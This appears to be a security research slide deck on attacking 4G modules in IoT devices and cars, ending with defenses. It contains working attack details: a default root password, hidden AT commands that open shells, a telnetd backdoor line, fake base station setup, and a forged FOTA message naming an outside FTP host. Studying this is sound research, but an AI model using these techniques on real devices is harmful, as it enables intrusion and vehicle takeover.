Baidu Security Lab

· Introduction of 4G modules · Attack Surfaces of 4G modules · Attack Preparations · Vulnerabilities Found and Exploitation · Suggested Defense Practice

Agenda

· Introduction of 4G modules · Attack Surfaces of 4G modules · Attack Preparations · Vulnerabilities Found and Exploitation · Suggested Defense Practice

4G Module Scenarios

· Devices with 4G modules
· IOT devices (vending machines, 4G hotspot/router) · Industrial equipment (intelligent charging station)
· Reason for the need of 4G modules
· Provide connectivity to the Internet / Internal Network · Connect to vendor cloud service for various purposes.
(module upgrades / remote management ...)

Mini PCI-E

M.2

LCC

driverless car
advertising machine
vending machine
laptop
.....

4G WiFi hotspot/ 4G router
intelligent charging station
in-vehicle infotainment
system

YC vending machine Mini PCI-E

Tesla Model S LCC

Four-Faith Industrial 4G router Mini PCI-E

DaTang 4G WiFi One 4G chip for both 4G connection and router system

4G Module Internal structure
· Hardware Components
· Main Chip
· Baseband+ARM (In one chip, e.g. : Qualcomm MDM9x07 series
· Flash
· NAND+DDR in one chip (Qualcomm) · NAND (Huawei HiSilicon / ZTE , DDR flash inside
· Others:
· Power Management / RF / (WiFi / SD / Bluetooth / GPIOs
· Software Components
· OS
· Embedded Linux System · RTOS (Mvrwell/ASR)
· Baseband system

VC7912
Same as SKY77912 A Tx/Rx Front-End Module, support 234G
VC7645
Same as SKY77645 A Power Amplifier Module
PMD9607
Power Management IC
Mini PCI-E Interface

Antenna

The Quectel EC20 4G module Internal structure
WTR2965
RF Transceiver
Qualcomm MDM9607 CPU and Modem
Cortex A7 @1.3GHz running Linux kernel
SnapdragonTM X5 LTE (9x07) modem supports LTE Category 4
FM6BD1G1GMB ESMT MCP
1Gbit NAND flash + 1Gbit DRAM BGA162

minimum system
· Install the drivers · OS chooses and loads the right driver by VID/PID/Interface · Use AT command to set the APN / get the signal strength ... (if
needed) · OS will create the network card: usb0 / ppp0 / wwan / .... · Get IP address (10.x or 192.168.x) · Done

How the 4G module works

VID PID 0x2949 0x8241
0x2949 0x8242
0x2949 0x8243
0x2949 0x8247

interface
RNDIS(00) MODEM(02) TTY(03 NMEA) TTY(04 AT) Diag(05) RMNET(06)
ECM(00) MODEM(02) TTY(03 NMEA) TTY(04 AT) Diag(05)
RMNET(00) MODEM(01) TTY(02 NMEA) TTY(03 AT) Diag(04)
MODEM(00) TTY(01 NMEA) TTY(02 AT) Diag(03) RMNET(04)

Dial mode PPP/RNDIS/RMNET
PPP/ECM PPP/RMNET PPP/RMNET

Board IP: 10.63.87.33

How the 4G module works
PPP / RMNET(Gobi Net) Board get a Public Address

RNDIS / CDC-ECM / QMI WWAN Board get a Private Address The 4G module as a router

Module IP: 10.2.3.4

Board IP: 192.168.225.36

Module IP: 192.168.225.1

Motivation
· Not much prior efforts
· Shed a light on attack surfaces of 4G modules & inspire new hacking tricks
· Car Hacking
· RCE vulnerabilities found in vehicles with T-Box (4G module inside) from 5+ auto makers.
· Baseband Hacking
· Effective on various baseband chipsets from major vendors. · More debugging tool introduced
· IOT Hacking · Universal Hacking
· You will own the ability of network traffic controlling

· Introduction of 4G modules · Attack Surfaces of 4G modules · Attack Preparations · Vulnerabilities Found and Exploitation · Suggested Defense Practice

Software Component ­ Embedded Linux
· LTE protocol is complex, include several releases
· Need to support 2/3/4G, Multi-Mode MultBand
· Support expanded AT command, e.g. HTTP / MQTT / FTP protocol....
· Support connection mode: PPP / CDC-ACM / CDC-ECM / RNDIS.....
· Support peripheral: WiFi / Bluetooth .... · Support FOTA upgrade, remote or web
management · Support secondary development

Embedded Linux ­ Nursery of Vulnerabilities
· Full Linux system
· Most of them use RNDIS / ECM mode (means unique IP, routability)
· Exposed attack surfaces
· The Linux has a IP address, which can be accessed directly · The Linux listens on some port, or connect to vendor Cloud services (for upgrade or
remote management, etc.)
· Potential Sources of Vulnerabilities being a Linux host exposed on the Internet
· System Services / remote management / OTA upgrade ....

Additional Attack Surfaces
· Wireless Cellular devices
· Mis-configurations of operator network allow access to the Internal network · With 2G support, it is easy to control network traffic with a fake base station
· Sniff · MITM · Access ports
· 3rd Party Customization
· Buggy/unsafe implementation · Reverse Engineering

Thought Process While Attacking
· Before Exploit
· get shell / analyze firmware / analyze network traffic, mine vulnerabilities
· Run Exploit
· Traditional methods:
· Under same Local Area Network: WiFi & wired network, access open port to run exploit · Gain access by using weak pass of WiFi hotspot / 8 digit pass...
· New methods:
· Mis-configurations of operator network, which makes large range remote attack become possible under the same LAN
· 2G -- > Gain full control network traffic
· Access open ports · Monitor / modify data (OTA / browser vulnerabilities)
· Others, such as SMS controlling / Cloud problems

Attack by Using Fake Base Station
· Existing problems of GSM (2G)
· Client can't identify whether the station is real or not
· All these modules support GSM · This situation will NOT be fixed
· Solve the problem of auto attach
· Inspired by Pseudo Base Station in China · Increase cell reselection parameters C1&C2
· Not only sends SMS, also controls network traffic
· Enable GPRS function · Hardcode C2 value

Attack by Using Fake Base Station
· How to build
· Hardware: BladeRF · Software: YateBTS (easy to build, set, code) · Hardcode C2 to max, then compile
· Remember: Testers have to observe the law. Using Electromagnetic shielding box is the best

Attack by Using Fake Base Station
· Downgrade the module to 2G by jamming · Devices with 4G modules attach to the fake station automatically · Now we can
· Monitor all the IP data transmission · Access the port, run the exploit · Modify the data
· It seems the system management services have been hacked

Attack in the Operator Intranet
· Goal: Large-scale long-range attacks · Operators often put the 4G clients in a LAN,
and there is no network isolation!
· 10.x.x.x or 172.x.x.x · IP:port is accessible · Mis-configurations & Roaming
· So we can remotely attack via ADBtelnet webssh...

Attack via Private APN
· Private APN Introduction
· Devices are connected to a private network, invisible to the public internet · The devices require special SIM card and APN point (Especially most car
companies and well-known IOT equipment · Access to intranet resources directly via VPN in the air · Special mode of the Operator Intranet
· Private APN Attack Surfaces
· Disabled network isolation due to the need to access servers in the intranet. · Same type of various devices make centralized attacks possible

Attack via Private APN
· Special SIM card, APN settings
· Many car companies / equipment use e-sim
· Same as SIM card
· Special APN: Get from firmware / logs
· Connect to Private APN network, scan vulnurbilities
· Install e-SIM to our 4G module · Set the APN by AT command / webpage config

· Introduction of 4G modules · Attack Surfaces of 4G modules · Attack Preparations · Vulnerabilities Found and Exploitation · Suggested Defense Practice

· Get Firmware / Rom

· Get

Shell

· Get Data Transmission

Prior to the Attack
At least 1 for a successful attack

Multiple Ways to Get Firmware
· Get the firmware-update program
· Unpacking the program, and retrieve the file system
· Get the upgrade tools from vendor tech support
· Like Qualcomm series, most of the modules have 9008 mode, which could restore all the system
· The tools include all partitions
· Get a shell · Last Resort: NAND Flash Dump

Unpack Firmware Upgrade Program
A packaged .exe file the firmware-update program for one top seller 4G WiFi At offset 0x127C172 a zip package
Unzip, then we get all the files of Linux system partition

Through Firmware Upgrade Tool
· Qualcomm chipset modules have 9008 download mode
· Underlying system is writable · Focus on system partition

Through Firmware Upgrade Tool
· Partitions Retrieved · Inspect system.img
· Retrieve Linux system files in UBIFS format

Through NAND Flash Dump
· NAND Flash Dump is more complicated
Different size Same pins BGA 63

Through NAND Flash Dump
· Use binwalk to identify filesystem from the flash dump · Cut the file from the right offset · Mount the filesystem !

· Serial ports are mapped as debug ports / Linux console

· Remember a widely used password

· root / oelinux123
· Login directly without password

· Special contact on circuit board · Some interface on Tesla (Already fixed)

· Open Services adb / telent / ssh...

· Fast scan, like masscan

· USB adb · ADB on prot 5555

No Authentication

· telnet (week password or cracked password)

Ways to Get a shell

· Through hidden AT command
· Enable ADB
· Simcom 7600: AT+CUSBADB=1,1 · Fibocom L718: AT+ADBDEBUG=1

Ways to Get a shell

· Hidden system command execution
· Quectel EC20: AT+QLINUXCMD="echo test > /dev/ttyGS0" · Command injection
· Last Resort: Hacking into the Nand Flash
· Grab the NAND Flash Dump · Modify file system, add "/bin/busybox telnetd -l /bin/sh &" in init file · Re-attach the Nand Flash

Ways to Get Network Traffic
· Assume tcpdump capability · Build a 4G base station
· For researching, steady, convenient and fast
· Use srsLTE (install easily than OAI) · Choose SDR devices
· USRP B200/B210/B200 mini · Bladerf x40 xa4 · LimeSDR
· Write SIM card
· Writeable LTE test card (Only for test) · SIM card reader

Ways to Get Network Traffic

Write the sim card with our KI / OP / OPC

Run the srsLTE base station system

Recap
· After Attack Preparations
· Get shell (high probability, adb shell) · Get file system (surely, NAND dump) · Get opened ports (surely, port scan) · Get connection between Cloud (surely, fake station)
· In case the above doesn't work
· In most cases, after installing the correct drivers and setting to the correct AT mode, use ADB (USB) could get a root shell

· Introduction of 4G modules · Attack Surfaces of 4G modules · Attack Preparations · Vulnerabilities Found and Exploitation · Suggested Defense Practice

Attack Via Vulnerabilities Discovered
· System management service vulnerabilities
· Port scan: masscan ­p 1-65535 192.168.99.100 ­rate=3000
· Port view: netstat -tunlp

Attack Via Vulnerabilities Discovered
· Opened telnet service
· Search password file from flash dump, use hashcat to crack the password with GPU

Attack Via Vulnerabilities Discovered

· Opened remote ADB

· We found many top seller modules open the remote ADB service by default.

· Convenient for 3rd party customization

Brand

ZTE /

LONGSUN YUGE

NEOWAY SIMCOM

...........

GOSUNCN G

mode port

ME3630 5555

U9300 U9507C
5555

CLM920 5555

N720 5555

· Others
· Web management with weak password · SSH with empty password · .........

SIM7600
5565(need open by self, some OEM manufacturers open it

Ranged attack - control the CAN bus
· A brand of car has an APP to remotely unlock the car and launch the engine.
· Buy the T-box from Auto Parts Shop. · No USB ADB, no tcp ADB, no telnet, how to get a shell?
· Firmware dump with NAND programmer. · With the network monitor methods, we obtain the traffic of the 16xxx port and
located the bin. · Reverse engineering, not much functionality, but including enable USB ADB · Successfully turned on USB ADB, and get shell. · Another process listens on port 29xxx, Use IDA Pro to analyze

Ranged attack - control the CAN bus
· find "recv" or "bind" in imports, and look at the xrefs

· go into the function where execute the recv data and do the encryption algorithm reverse.

Ranged attack - control the CAN bus
· The function which dispatch the receive command · Include open the telnet!

· The keys
· All of the interaction is based on AES and RSA encryption
· The AES key is hard-coded in binary · RSA private file is stored on disk
and has a password · But the password is is hard-coded in
binary too, and in actually it's very easy to guess ­ The company's name
· So, Let's write the exploit
· At last, we opened the telnet

Ranged attack - control the CAN bus
· New problem:
· The telnet need passwd · So we crack the hash with our Nvidia
2080Ti X 4 for a day · Final get the root password:
· Include uppercase\lowercase\numbers
· Now we get the root shell · But how to control the car easily?

Cloud server
SSL app

10.x.x.x Internal Servers

4G Module

the whole vehicle

TBOX

4G

SSL

MPU(Linux) dcpd

UART

CAN dcpd MCU(RTOS)

CAN bus

Ethernet Over USB
In-Vehicle Infotainment (Android)

Ethernet

Dashboard (QNX)

Skylight Lock Engine .......

Ranged attack - control the CAN bus
Omnipotent root shell
· After we got the root shell, so many ways to control the CAN bus
· The standard methods:
· Reverse the dcpd bins of MCU and MPU · Send Open Skylight command to UART
· Now we introduce a easy way:
· Use GDB script to get the args sequence(r4, r5, r6),
· A exploit ,to send the message sequence to the queue
· Bingo !

Ranged attack - control the CAN bus
The last question: How to exploit
· Do you remember the attack methods that I mentioned?
· Use the fake base station · Use Operator Intranet / Private APN · Under the WiFi hotspot
· Each of them could control the CAN bus. · For example:
· Use the Private APN,Scan ports,run exploit · We can build the Zombie Cars ,Just like in
Furious 8

· FOTA(Firmware Over-The-Air), a way to upgrade firmware.
· Some modules request the latest version from Cloud every few minutes
· Use IDA to analyze the bin
· Hardcoded user and pass
· So we log in the FTP Server
· Firmware for various types of 4G modules
· Writeable permission !

Attack FOTA ­ Server side

Attack FOTA ­ Server side
We can hack all the 4G modules again!
· No verification of the firmware · Replace the firmware with
backdoor inside · So, we can hack all the modules
of this brand in a day!

Attack FOTA ­ Client side
· Some modules listening on a TCP/UDP prot to accept upgrade command
· The listening port is used for Interprocess Communication · But it's bound on 0.0.0.0:30xxx, not 127.0.0.1:30xxx(our chance!) · Use IDA to analyze the bin

Attack FOTA ­ Client side
· With some reverse engineering:
· The protocal on UDP port 30xxx is encrypted · Used for receive the FOTA upgrade package information · After analysis, we found the key is hard-coded
· So, now we can access the port, and forge the upgrade message

· After decrypt, the port receive a json, and get the OTA file through FTP
· The process need to check the FOTA package first, with right structure
· So we have reversed them
· Now we can run our exploit
· Update any file (init.rc....) · Use Private APN · Use fake base station

Attack FOTA ­ Client side
{"id":"868221043956591","content":"", "msg":"upgradeNeed","file":"abc","acc ount":"test","password":"aaaaaa","ftp Host":"67.218.131.xxx:6666"}

AT command vulnerability
· Each module has its own AT command processing process to implement custom commands.
· Example
· Connect mqtt : AT+CMQTTCONNECT · Send http : AT+CHTTPSSEND
Hidden AT commands, which can open ADB or execute the shell (mentioned earlier). No string filter, which will cause Command injection.

AT command vulnerability
Use AT command vulnerability to get a remote shell
· Some modules use SMS to send AT command
· Easily remote management
· If
· we could find an AT command injection vulnerability · Use fake base station to send SMS · Or known the No. of SIM card
· It will be hacked, again.

AT command vulnerability
· To send AT command with SMS, need a password
· After reversed, we found the default was hard-coded, too. · Most of the time, users don't change it
· When we send "adminat+ver;" ,we get the result:

· Let's find the dispatch function

AT command vulnerability

AT command vulnerability
· Go deep of the map function, try to find which AT command call the danger functions, such like system()
· Variable is string type, and can be controlled such like %s
· At last, we find theA T+SETFCSN has a command injection

More Attack Tips
· Through the Browser
· Older version of Chrome is found in a IVI system of a vehicle from a well-known automaker · Vulnerability is identified from the specific version of Chrome · Get control the network traffic & get a shell of IVI by using a fake station
· Through the Debug Process
· LKCore is found in the debug process integrated by several manufactures · It's a bug dump process of Qualcomm chipset, listen on port 5005/5007 · After fuzzing this port, a DDOS vulnerability was found, which results in kernel core
exception & dysfunctional module unless it is manually restarted.
· Through weak password of 4G wifi which uses 8 digit password
· Use Deauth to get the handshake package, then crack the password with 2080Ti X 4 within 50 seconds
· Upload the firmware with the backdoor

· Introduction of 4G modules · Attack Surfaces of 4G modules · Attack Preparations · Vulnerabilities Found and Exploitation · Suggested Defense Practice

Suggested Simple Defense Practice
· Get aware of the vulnerabilities in hidden attack surfaces
· Identify whether there is a Linux system inside.(especially for some Auto Manufacturers)
· Look for services/processes listening on open ports · Be aware of the easy access from the 4G interfaces · Empty iptables rules in most modules
· FireWall !
· Apply this rule:
· iptables -A INPUT -i rmnet_data0 -j DROP (replace the interface name if not Qualcomm)
· Then 90% of the vulnerabilities could be defended

Q&A

